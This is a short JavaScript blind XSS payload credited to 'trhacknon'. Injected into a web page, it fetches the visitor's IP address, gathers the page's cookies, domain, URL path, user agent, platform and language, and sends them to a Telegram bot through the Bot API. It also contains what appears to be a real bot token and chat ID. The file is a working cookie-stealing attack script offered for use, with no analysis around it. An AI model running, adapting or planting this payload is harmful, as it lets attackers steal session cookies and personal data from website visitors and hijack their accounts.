var tokenBot = '6003683438:AAEHevPU8UW5paysUEZUsq0FbiaBzdjQQLw'; // Your "tokenBot" Here
var chatId = '-1001690993326'; // Your "chatId" Here

/*
         _                     _       _
        | |____  _____ ___    | |_ ___| | ___
        | '_ \ \/ / __/ __|___| __/ _ \ |/ _ \
        | |_) >  <\__ \__ \___| ||  __/ |  __/
        |_.__/_/\_\___/___/    \__\___|_|\___|
        ------ Blind XSS Alert Telegram ------
                                   trhacknon
*/

function getIPAddress(callback) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            callback(xhr.responseText);
        }
    };
    xhr.open('GET', 'https://api64.ipify.org?format=json', true);
    xhr.send();
}

function telegramSend(tokenBot, chatId, ipAddress) {
    var textData = `
<b>Blind XSS Alert by trhacknon</b>

<b>XSS Alert in ${document['domain']}</b>
------------------------------------------------

<b>- URL Target -</b>
<pre>${document['location']['hostname']}${document['location']['pathname']}</pre>

<b>- Document Cookie -</b>
<pre>${document['cookie']}</pre>

<b>- User Agent -</b>
<pre>${navigator.userAgent}</pre>

<b>- Platform -</b>
<pre>${navigator.platform}</pre>

<b>- Language -</b>
<pre>${navigator.language}</pre>

<b>- Online Status -</b>
<pre>${navigator.onLine}</pre>

<b>- IP Address -</b>
<pre>${ipAddress}</pre>
`;

    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(textData) + '&parse_mode=html', true);
    xhr.send();
}

getIPAddress(function (ipAddress) {
    telegramSend(tokenBot, chatId, ipAddress);
});
